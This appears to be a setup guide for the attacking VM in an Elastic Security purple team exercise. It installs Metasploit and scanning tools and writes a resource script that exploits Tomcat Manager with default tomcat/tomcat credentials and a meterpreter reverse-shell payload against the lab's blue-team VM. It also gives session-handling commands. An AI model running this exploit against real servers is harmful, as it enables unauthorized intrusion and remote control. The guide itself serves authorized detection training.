# Elastic Security Demo - Red Team VM Setup Guide

## Overview

This guide will help you set up the red team VM for the Elastic Security purple team exercise. This VM is used to execute simulated attack scenarios against the blue team VM.

**Estimated Setup Time:** 15-20 minutes
**Target OS:** Ubuntu 22.04 or 24.04 LTS (provisioned by Terraform)
**Required Disk Space:** 20GB

---

## Table of Contents

1. [Connect to Red Team VM](#connect-to-red-team-vm)
2. [Install Metasploit Framework](#install-metasploit-framework)
3. [Install Additional Tools](#install-additional-tools)
4. [Configure Metasploit](#configure-metasploit)
5. [Verification](#verification)
6. [Troubleshooting](#troubleshooting)

---

## Connect to Red Team VM

After Terraform deployment completes, get the connection information:

```bash
# From your local machine in terraform/ directory
terraform output red_vm

# Connect via SSH
ssh -i ~/.ssh/id_rsa ubuntu@<red-01-public-ip>
```

---

## Install Metasploit Framework

### Method 1: Quick Install (Recommended)

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install -y curl wget git build-essential libssl-dev libreadline-dev zlib1g-dev

# Download and run Metasploit installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Verify installation
msfconsole --version
```

### Method 2: Manual Install

```bash
# Install dependencies
sudo apt install -y curl wget git build-essential libssl-dev \
  libreadline-dev zlib1g-dev autoconf bison libyaml-dev \
  libncurses5-dev libffi-dev libgdbm-dev postgresql postgresql-contrib

# Install Ruby (required for Metasploit)
sudo apt install -y ruby-full

# Clone Metasploit
cd ~
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework

# Install bundler and dependencies
gem install bundler
bundle install

# Add to PATH
echo 'export PATH="$HOME/metasploit-framework:$PATH"' >> ~/.bashrc
source ~/.bashrc
```

---

## Install Additional Tools

```bash
# Network scanning
sudo apt install -y nmap

# Additional penetration testing tools
sudo apt install -y netcat-traditional curl wget

# Optional: john the ripper for password cracking demonstrations
sudo apt install -y john

# Optional: nikto for web vulnerability scanning
sudo apt install -y nikto
```

---

## Configure Metasploit

### Initialize Metasploit Database

```bash
# Initialize the database
sudo msfdb init

# Start msfconsole and verify database connection
msfconsole

# Inside msfconsole, check database status
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

# Exit msfconsole
msf6 > exit
```

### Create Demo Resource Script

Create a resource script for quick demo setup:

```bash
# Create demo script
cat > ~/tomcat_exploit.rc << 'EOF'
use exploit/multi/http/tomcat_mgr_upload
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST <RED-01-PRIVATE-IP>
set RHOST <BLUE-01-PRIVATE-IP>
set payload java/meterpreter/reverse_tcp
EOF

echo "Resource script created at ~/tomcat_exploit.rc"
echo "Edit the script and replace <RED-01-PRIVATE-IP> and <BLUE-01-PRIVATE-IP> with actual IPs"
```

To get the private IPs:

```bash
# On red-01 VM - get red team private IP
hostname -I | awk '{print $1}'

# From your local machine - get blue team private IP
terraform output blue_vm
```

Update the resource script:

```bash
# Edit the script with actual IPs
nano ~/tomcat_exploit.rc
```

---

## Verification

Run these checks to verify your setup:

```bash
# Check Metasploit installation
echo "=== Metasploit Version ==="
msfconsole --version

# Check database connection
echo "=== Database Status ==="
msfconsole -q -x "db_status; exit"

# Check network tools
echo "=== Network Tools ==="
which nmap && nmap --version | head -n 2
which nc && echo "Netcat: Installed"

# Test connectivity to blue team VM
echo "=== Testing Connectivity to Blue Team VM ==="
read -p "Enter blue-01 private IP: " BLUE_IP
ping -c 3 $BLUE_IP
nmap -p 8080 $BLUE_IP
```

---

## Troubleshooting

### Metasploit Database Issues

If database connection fails:

```bash
# Restart PostgreSQL
sudo systemctl restart postgresql

# Reinitialize database
sudo msfdb reinit

# Check status
sudo msfdb status
```

### Network Connectivity Issues

```bash
# Verify security groups allow traffic
# From red-01, test connection to blue-01

# Test ICMP (ping)
ping -c 3 <blue-01-private-ip>

# Test Tomcat port
nc -zv <blue-01-private-ip> 8080
# or
telnet <blue-01-private-ip> 8080

# If connection fails:
# - Verify security groups in AWS Console
# - Check that blue-01 VM is running
# - Verify Tomcat is running on blue-01
```

### Metasploit Console Errors

```bash
# Clear cache
rm -rf ~/.msf4/store/

# Update Metasploit
sudo msfupdate

# Restart database
sudo msfdb stop
sudo msfdb start
```

---

## Quick Reference

### Common Commands

```bash
# Start Metasploit console
msfconsole

# Load resource script
msfconsole -r ~/tomcat_exploit.rc

# Start with quiet mode (no banner)
msfconsole -q

# Check database status
msfconsole -q -x "db_status; exit"
```

### Inside Metasploit Console

```
# Search for exploits
search tomcat

# Use an exploit
use exploit/multi/http/tomcat_mgr_upload

# Show options
show options

# Set options
set RHOST <target-ip>
set LHOST <your-ip>

# Run exploit
exploit

# Background session
background

# List sessions
sessions -l

# Interact with session
sessions -i 1
```

---

## Directory Structure

After setup, your red team VM should have:

```
~/ (Home Directory)
├── tomcat_exploit.rc       # Metasploit resource script
└── metasploit-framework/   # Metasploit installation (if manual install)
```

---

## Next Steps

1. Verify connectivity to blue team VM (blue-01)
2. Ensure blue team VM has Tomcat running on port 8080
3. Follow `instructions/demo-execution-script.md` for the complete purple team exercise
4. Rule development and deployment is done from your local machine (see `instructions/local-setup.md`)

---

## Resources

- **Metasploit Documentation:** https://docs.metasploit.com/
- **Metasploit Unleashed (Free Training):** https://www.offensive-security.com/metasploit-unleashed/
- **Rapid7 GitHub:** https://github.com/rapid7/metasploit-framework

---

## Security Notes

This VM is configured for authorized purple team exercises only:
- Only use against the designated blue team VM (blue-01)
- Do not use techniques against any unauthorized systems
- This is for educational and demonstration purposes only
- All activities should be documented as part of the purple team exercise
